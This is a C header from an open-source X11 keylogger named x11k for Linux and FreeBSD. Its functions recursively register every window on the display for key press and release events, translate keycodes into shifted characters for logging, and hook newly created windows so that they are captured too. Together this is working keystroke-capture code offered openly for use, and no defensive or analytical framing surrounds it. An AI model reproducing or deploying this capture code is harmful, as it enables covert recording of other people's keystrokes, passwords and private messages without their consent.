/*
 * x11k - Keylogger for POSIX systems (linux, freebsd) with X11
 *
 * Copyright (C) 2016  xdevelnet (xdevelnet at xdevelnet dot org)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef X11K_X11ROUTINES_H
#define X11K_X11ROUTINES_H

#include <X11/Xutil.h>

Display *getdisplay() {
	Display *display = XOpenDisplay(getenv("DISPLAY"));
	if (display == NULL) {
		fprintf(stderr, "Can't open display.\n");
		exit(EXIT_FAILURE);
	}
	return display;
}

void select_window(Display *d, Window window) {
	XWindowAttributes attrs;
	XGetWindowAttributes(d, window, &attrs);
	//long int events = ((attrs.all_event_masks | attrs.do_not_propagate_mask) & KeyPressMask);
	long int events = ((attrs.all_event_masks | attrs.do_not_propagate_mask) & (KeyPressMask | KeyReleaseMask));
	XSelectInput(d, window, (StructureNotifyMask | SubstructureNotifyMask | events));
}

void catch_all_windows(Window window, Bool top, Display *display) {
	Window  root, parent, *children;
	unsigned int nchildren;

	if (!XQueryTree(display, window, &root, &parent, &children, &nchildren)) return;
	select_window(display, window);
	if (children) {
		while (nchildren) catch_all_windows(children[--nchildren], top, display);
		XFree(children);
	}
}

char shift_if_possible(char key) {
	if (key == '-') return '_';
	if (key == '=') return '+';
	if (key == ',') return '<';
	if (key == '.') return '>';
	if (key == '/') return '?';
	if (key == '<') return '>';
	if (key == '\'') return '"';
	if (key == ';') return ':';
	if (key == '[') return '{';
	if (key == ']') return '}';
	if (key == '`') return '~';
	if (key >= 'a' and key <= 'z') return key-('a'-'A'); // ASCII uppercase
	return 0;
}

signed char shift_is_pressed = 0;

int print_key_with_fancy_way(FILE *stream, unsigned int keynum) {
	// should be deeply rewritten to make output much more readable when user typing some text
	// currently, "fancy" way is shifting some characters
	static char key = 0;
	if (keynum == 50 or keynum == 62) shift_is_pressed = 1;
	if (shift_is_pressed == 1 and (key = shift_if_possible(*keycodestrings[keynum])) != 0) return fprintf(stream, "%c", key);
	return fprintf(stream, "%s", keycodestrings[keynum]);
}

// All functions below are not needed for production, only for debugging purposes.

char *get_resname(Window w, Display *display) {
	static char name[128];
	XClassHint *h;

	if((h = XAllocClassHint()) != NULL) {
		if(XGetClassHint(display, w, h) == False) {
			XFree(h);
			return("???");
		}
		strcpy(name, h->res_name);
		XFree(h);
		return((char *) name);
	}
	else return("???");
}

void addwindow(XEvent *event, Display *display) {
	static char *name;
	static Window lastcreated;
	lastcreated = event->xcreatewindow.window;

	if (event->xcreatewindow.x < 0 or event->xcreatewindow.y < 0) return; //for some unexpected reasons Xorg can create some
	// "ghost" windows, and any attempts to capture it (select_window() or even get additional info XFetchName will cause
	// crash. Then only one way to detect these windows is to check x and y structure fields for being negative. (-100, -100)
	// UPD: Same shit when I'm trying to run xterm. It creates 1x1 ghost windows. We should not try to capture it.
	// Yay! Debugging with prints! :D

	fprintf(stderr,
			"\ntype: %d\n"
					"serial: %lu\n"
					"send event: %d\n"
					"display: %p\n"
					"parent: %lu\n"
					"window: %lu\n"
					"x: %d y: %d\n"
					"width: %d height: %d\n"
					"border_width: %d\n"
					"override_redirect: %d\n",
			event->xcreatewindow.type, event->xcreatewindow.serial, event->xcreatewindow.send_event, event->xcreatewindow.display,
			event->xcreatewindow.parent, event->xcreatewindow.window, event->xcreatewindow.x, event->xcreatewindow.y,
			event->xcreatewindow.width, event->xcreatewindow.height, event->xcreatewindow.border_width, event->xcreatewindow.override_redirect);

	if(XFetchName(display, lastcreated, &name))
	{
		printf("\nAdded window: %s, res_name: %s, wid: %lu \n", name, get_resname(lastcreated, display), lastcreated);
		XFree(name);
	}

	//if (lastcreated != event->xcreatewindow.window)
	{
		//lastcreated = event->xcreatewindow.window;
		select_window(display, lastcreated);
	}
}

#endif